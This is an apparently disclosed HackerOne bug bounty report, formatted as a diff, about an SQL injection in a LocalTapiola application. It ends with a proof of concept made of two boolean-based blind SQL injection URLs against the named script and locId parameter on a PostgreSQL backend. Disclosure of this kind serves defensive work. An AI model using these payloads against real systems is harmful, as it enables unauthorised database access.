@@ -1,0 +1,39 @@
+ReportLink:https://hackerone.com/reports/181826
+WeaknessName:SQL Injection
+Reporter:https://hackerone.com/bobrov
+ReportedTo:LocalTapiola(localtapiola)
+BountyAmount:350.0
+Severity:medium
+State:Closed
+DateOfDisclosure:08.12.2016 13:19:39
+
+Summary:
+##Issue
+
+The reporter found an SQL injection in one of the applications in viestinta.lahitapiola.fi. 
+
+##Fix
+
+The issue was investigated and found to be valid and critical. 
+
+##Reasoning
+
+The reported case was valid and right on target for the scope of the bug bounty program. SQL injections are always critical as they pose a serious threat to the underlying database and the information therein. Even in the case of the data being public information - as was the case here -  there are still many vectors for seriously misusing this kind of a vulnerability. 
+
+The bounty decision was based on the fact that the reporter found two very similar vulnerabilities (a pattern issue, #181803 and #181826) -  the bounty was bundled and then split amongst both reports.
+**Vulnerable script**: /webApp/sijoitustalous_peruutus
+**Vulnerable parameter**: locId
+**Database**: PostgreSQL
+
+**PoC**
+1. TRUE, substr(version(),1,10)='PostgreSQL', Result: Ilmoittaumisesi on peruttu
+
+```
+http://viestinta.lahitapiola.fi/webApp/sijoitustalous_peruutus?regId=253685182&locId=78976538+and+case+when+substr(version(),1,10)=%27PostgreSQL%27+then+true+else+cast(version()%20as%20numeric)=1+end
+```
+
+2. FALSE, substr(version(),1,10)='PostgreXXX', Result: An error occurred
+
+```
+http://viestinta.lahitapiola.fi/webApp/sijoitustalous_peruutus?regId=253685182&locId=78976538+and+case+when+substr(version(),1,10)=%27PostgreXXX%27+then+true+else+cast(version()%20as%20numeric)=1+end
+```
